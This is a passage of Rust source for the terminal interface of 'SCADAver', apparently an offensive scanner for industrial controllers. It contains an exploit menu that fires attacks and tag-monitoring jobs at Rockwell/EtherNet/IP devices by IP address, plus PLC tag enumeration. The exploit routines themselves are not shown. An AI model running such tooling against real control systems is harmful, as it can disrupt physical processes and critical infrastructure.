            app.exploit_sel = app.exploit_sel.saturating_sub(1);
        }
        KeyCode::Enter => {
            let is_back = app.exploit_defs.get(app.exploit_sel)
                .map_or(false, |e| e.label.starts_with('\u{2190}'));
            if is_back {
                app.mode = Mode::Normal;
            } else {
                let needs_input = app.exploit_defs.get(app.exploit_sel).map_or(false, |e| e.needs_input);
                if needs_input {
                    app.input_buf.clear();
                    app.mode = Mode::ExploitInput;
                } else {
                    fire_exploit(app, "");
                }
            }
        }
        _ => {}
    }
}

fn handle_exploit_input(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => { app.mode = Mode::ExploitMenu; app.input_buf.clear(); }
        KeyCode::Enter => {
            let input = app.input_buf.clone();
            fire_exploit(app, &input);
            app.mode = Mode::ExploitMenu;
            app.input_buf.clear();
        }
        KeyCode::Backspace => { app.input_buf.pop(); }
        KeyCode::Char(c) if app.input_buf.len() < 64 => app.input_buf.push(c),
        _ => {}
    }
}

fn handle_search(app: &mut App, code: KeyCode) {
    match code {
        KeyCode::Esc => {
            app.input_buf.clear();
            app.filter.clear();
            app.rebuild_filtered();
            app.mode = Mode::Normal;
        }
        KeyCode::Enter => {
            app.filter = app.input_buf.clone();
            app.rebuild_filtered();
            app.mode = Mode::Normal;
        }
        KeyCode::Backspace => {
            app.input_buf.pop();
            app.filter = app.input_buf.clone();
            app.rebuild_filtered();
        }
        KeyCode::Char(c) => {
            app.input_buf.push(c);
            app.filter = app.input_buf.clone();
            app.rebuild_filtered();
        }
        _ => {}
    }
}

/// Load saved tags from DB into the output panel (synchronous).
/// Returns true if any tags were found.
fn load_db_tags_to_output(ip: &str, lines: &mut Vec<String>) -> bool {
    use crate::db::Database;
    use crate::vendors::rockwell::driver;

    let db = match Database::open(&Database::default_path()) {
        Ok(d) => d,
        Err(_) => return false,
    };
    let tags = match db.load_tags(ip) {
        Ok(t) if !t.is_empty() => t,
        _ => return false,
    };

    lines.push(format!("══ {} saved tags @ {ip} (DB snapshot) ══", tags.len()));
    let [hdr, sep] = tag_header();
    lines.push(hdr);
    lines.push(sep.clone());
    for t in &tags {
        let (base, dims) = driver::type_parts(t.tag_type as u16);
        lines.push(fmt_tag_row(t.instance_id, &t.name, &base, dims, "-", t.tag_type));
    }
    lines.push(sep);
    lines.push(format!("[+] {} tag(s) loaded from database", tags.len()));
    true
}

/// Called when the exploit menu opens for Rockwell/enip with an empty output panel.
/// Shows saved DB tags immediately, then starts a background live-check for changes.
fn maybe_auto_load_tags(app: &mut App) {
    let vendor = match app.selected_vendor() {
        Some(v) => v,
        None => return,
    };
    if !matches!(vendor.to_lowercase().as_str(), "rockwell" | "enip") {
        return;
    }
    if !app.output_lines.is_empty() {
        return;
    }
    let ip = match app.selected_device_ip() {
        Some(i) => i,
        None => return,
    };

    let has_tags = load_db_tags_to_output(&ip, &mut app.output_lines);

    if has_tags {
        app.output_lines.push(format!("── checking live tags @ {ip}... ──"));
        app.active_jobs += 1;
        let tx = app.scan_tx.clone();
        std::thread::spawn(move || {
            background_tag_check(ip, tx);
        });
    }
}

/// Background worker: enumerates live tags, diffs vs DB, reports changes.
fn background_tag_check(ip: String, tx: mpsc::Sender<ScanEvent>) {
    use crate::vendors::rockwell::driver;
    let out = |msg: &str| { let _ = tx.send(ScanEvent::Output(msg.to_string())); };
    match driver::enumerate_tags(&ip) {
        Ok(tags) => save_tags_and_diff(&ip, &tags, &out),
        Err(e)   => out(&format!("[-] Live tag check failed: {e}")),
    }
    let _ = tx.send(ScanEvent::Done(format!("tag refresh @ {ip}")));
}

fn fire_exploit(app: &mut App, input: &str) {
    if let (Some(ip), Some(vendor)) = (app.selected_device_ip(), app.selected_vendor()) {
        let exploit = app.exploit_defs.get(app.exploit_sel);
        let label      = exploit.map_or("exploit", |e| e.label);
        let is_monitor = exploit.map_or(false, |e| e.is_monitor);

        // Clear output only when nothing else is running; otherwise append
        if app.active_jobs == 0 {
            app.output_lines.clear();
            app.output_scroll = 0;
        }
        app.output_lines.push(format!("══ {label} @ {ip} ══"));
        app.log(format!("[*] Running: {label} on {ip}"));
        app.active_jobs += 1;

        if is_monitor {
            // Stop any previous monitor to avoid duplicates on the same IP
            if let Some(stop) = app.monitor_stop.take() {
                stop.store(true, Ordering::SeqCst);
            }
            let stop = Arc::new(AtomicBool::new(false));
            app.monitor_stop = Some(Arc::clone(&stop));
            let tx = app.scan_tx.clone();
            let ip2 = ip.clone();
            let label2 = label.to_string();
            std::thread::spawn(move || {
                let tx2 = tx.clone();
                let out = move |msg: &str| { let _ = tx2.send(ScanEvent::Output(msg.to_string())); };
                exploit_rockwell_monitor(&ip2, &out, stop);
                let _ = tx.send(ScanEvent::Done(format!("{label2} @ {ip2}")));
            });
        } else {
            run_exploit_for(&vendor, app.exploit_sel, &ip, input, label, app.scan_tx.clone());
        }
    }
}

// ─── Entry point ─────────────────────────────────────────────────────────────

pub fn run(db: Database) -> Result<()> {
    let mut app = App::new(&db)?;
    app.log("[*] SCADAver started. Press [?] for help, [S] to scan, [A] to add an IP.");

    let mut terminal = ratatui::init();
    let result = run_loop(&mut terminal, &mut app, &db);
    ratatui::restore();
    result
}

fn run_loop<B: Backend>(terminal: &mut Terminal<B>, app: &mut App, db: &Database) -> Result<()> {
    loop {
        app.drain_scan_events(db);
        terminal.draw(|f| draw(f, app))?;

        if event::poll(Duration::from_millis(50))? {
            if let Event::Key(key) = event::read()? {
                if key.kind == KeyEventKind::Press && handle_key(app, db, key.code, key.modifiers) {
                    break;
                }
            }
        }
    }
    Ok(())
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

fn hex_fmt(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02x}")).collect()
}
